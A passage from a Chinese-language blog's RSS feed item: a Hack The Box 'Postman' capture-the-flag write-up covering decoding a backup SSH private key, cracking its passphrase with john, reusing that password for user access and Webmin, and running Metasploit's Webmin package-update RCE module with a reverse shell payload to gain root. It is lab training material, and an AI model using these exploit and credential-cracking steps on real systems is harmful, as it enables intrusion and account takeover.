QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Mattssh_bak 

&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;和上一篇博客一样，之后在本机使用 ssh2john 将密钥转换为可破解的哈希格式，再使用 john 的自带字典进行 passphrase 的爆破&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;root@kali:~/home# ssh2john Mattssh_bak &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; matthash
root@kali:~/home# john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt matthash
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RSA/DSA/EC/OPENSSH &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH private keys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KDF/cipher &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/AES &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/3DES &lt;span class=&quot;nv&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Bcrypt/AES]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 1 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
Cost 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 2 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives, so it will keep trying even after
finding a possible candidate.
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
computer2008     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Matts.key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:01 10.16% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ETA: 04:52:13&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.5319g/s 862502p/s 862502c/s 862502C/s kifra9..kieukieu
Session aborted
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;得到 ssh 的密钥 &lt;code class=&quot;highlighter-rouge&quot;&gt;computer2008&lt;/code&gt;，但直接使用 ssh 无法成功登录，毕竟这是备份密钥，可能已经无法使用。但 &lt;code class=&quot;highlighter-rouge&quot;&gt;computer2008&lt;/code&gt; 作为 Matt 的一个密码可能会被重用在别的地方。先登录 redis 用户，再切换用户，尝试将密码输入，bingo!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;redis@Postman:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su Matt
Password: 
Matt@Postman:/var/lib/redis&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;Matt
Matt@Postman:/var/lib/redis&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd
&lt;/span&gt;Matt@Postman:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;user.txt
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x04-roottxt&quot;&gt;0x04 Root.txt&lt;/h2&gt;

&lt;p&gt;想起之前 10000 端口的 Webmin 服务，提示网站使用 SSL，将网址的 http 换成 https 即可。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fmt3f1j31c00u0jzi.jpg&quot; alt=&quot;Xnip2020-01-05_21-25-59&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用 Matt 和 computer2008 尝试登录，登录成功，网站本身没有什么东西，再次注意到 Webmin 的版本，搜索是否存在相关 exploit。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fxzn4yj31c00u0n54.jpg&quot; alt=&quot;Xnip2020-01-05_21-26-19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam0gatz9fj31c00u0aon.jpg&quot; alt=&quot;Xnip2020-01-05_21-29-21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发现 msf 已经集成了针对该版本可利用的 exploit&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; search webmin

Matching Modules
&lt;span class=&quot;o&quot;&gt;================&lt;/span&gt;

   &lt;span class=&quot;c&quot;&gt;#  Name                                         Disclosure Date  Rank       Check  Description&lt;/span&gt;
   -  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                         &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   3  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/linux/http/webmin_packageup_rce

msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options 

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/linux/http/webmin_packageup_rce&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name       Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   PASSWORD   computer2008     &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Webmin Password
   Proxies                     no        A proxy chain of format &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:host:port[,type:host:port][...]
   RHOSTS     10.10.10.160     &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&quot;s1&quot;&gt;'file:&amp;lt;path&amp;gt;'&lt;/span&gt;
   RPORT      10000            &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   SSL        &lt;span class=&quot;nb&quot;&gt;true             &lt;/span&gt;no        Negotiate SSL/TLS &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;outgoing connections
   TARGETURI  /                &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Base path &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Webmin application
   USERNAME   Matt             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cmd/unix/reverse_perl&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   LHOST  10.10.15.44      &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LPORT  4444             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Webmin &amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1.910

&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;设置好选项，注意 SSL 选项需要设置为 true&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.14.165:9004 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Session cookie: 8269def18359f1629182b2d26b9f86ed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to execute the payload...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command shell session 2 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.14.165:9004 -&amp;gt; 10.10.10.160:41404&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-11-28 05:12:27 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;root.txt
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x05-thanks&quot;&gt;0x05 Thanks！&lt;/h2&gt;

&lt;p&gt;也算是自己边学边记录，望大佬手下留情~&lt;/p&gt;

</description>
        <pubDate>Fri, 03 Jan 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/01/03/HTB-Postman/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/01/03/HTB-Postman/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        
      </item>
    
  </channel>
</rss>
